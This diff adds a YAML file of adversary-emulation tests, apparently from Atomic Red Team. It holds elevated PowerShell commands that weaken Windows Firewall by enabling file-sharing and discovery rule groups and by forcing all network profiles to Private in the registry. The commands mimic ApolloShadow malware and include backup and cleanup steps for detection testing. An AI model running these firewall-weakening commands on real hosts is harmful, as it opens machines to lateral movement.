@@ -1,0 +1,86 @@
+attack_technique: T1686.003
+display_name: 'Disable or Modify System Firewall: Windows Host Firewall'
+atomic_tests:
+- name: Enable Firewall Rule Group via COM Object (HNetCfg.FwPolicy2)
+  description: |
+    Uses the HNetCfg.FwPolicy2 COM object to enable the File and Printer Sharing and
+    Network Discovery firewall rule groups on the Private profile. This mirrors behavior
+    observed in ApolloShadow malware, which enables these rule groups to facilitate
+    lateral movement by making the host discoverable and enabling file sharing.
+
+    Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Back up current firewall rule group state for cleanup
+    prereq_command: |
+      if (Test-Path "$env:TEMP\T1686.003_firewall_backup.txt") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $fw = New-Object -ComObject HNetCfg.FwPolicy2
+      $groups = @("File and Printer Sharing", "Network Discovery")
+      $groups | ForEach-Object {
+          "$_=$($fw.IsRuleGroupEnabled(2, $_))" | Out-File -Append "$env:TEMP\T1686.003_firewall_backup.txt"
+      }
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $fw = New-Object -ComObject HNetCfg.FwPolicy2
+      $fw.EnableRuleGroup(2, "File and Printer Sharing", $true)
+      $fw.EnableRuleGroup(2, "Network Discovery", $true)
+    cleanup_command: |
+      $backupFile = "$env:TEMP\T1686.003_firewall_backup.txt"
+      if (Test-Path $backupFile) {
+          Get-Content $backupFile | ForEach-Object {
+              $parts = $_ -split '='
+              $group = $parts[0]
+              $wasEnabled = [System.Convert]::ToBoolean($parts[1])
+              $fw = New-Object -ComObject HNetCfg.FwPolicy2
+              $fw.EnableRuleGroup(2, $group, $wasEnabled)
+          }
+          Remove-Item $backupFile
+      }
+- name: Set All Network Profiles to Private via Registry
+  description: |
+    Modifies the Category value under each network profile GUID in
+    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles to 0 (Private).
+    This relaxes Windows Firewall rules and enables file sharing, a technique used by
+    ApolloShadow to reduce lateral movement difficulty. Only profiles not already set to
+    Private are modified, and their original values are saved to a backup file for cleanup.
+
+    Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Back up current network profile Category values for cleanup
+    prereq_command: |
+      if (Test-Path "$env:TEMP\network_profile_backup.txt") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $profilesPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
+      Remove-Item "$env:TEMP\network_profile_backup.txt" -ErrorAction SilentlyContinue
+      Get-ChildItem $profilesPath | ForEach-Object {
+          $category = (Get-ItemProperty $_.PSPath).Category
+          "$($_.PSChildName)=$category" | Out-File -Append "$env:TEMP\network_profile_backup.txt"
+      }
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $profilesPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
+      Get-ChildItem $profilesPath | ForEach-Object {
+          Set-ItemProperty $_.PSPath -Name Category -Value 0
+      }
+    cleanup_command: |
+      $backupFile = "$env:TEMP\network_profile_backup.txt"
+      if (Test-Path $backupFile) {
+          Get-Content $backupFile | ForEach-Object {
+              $parts = $_ -split '='
+              $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\$($parts[0])"
+              Set-ItemProperty $path -Name Category -Value ([int]$parts[1])
+          }
+          Remove-Item $backupFile
+      }
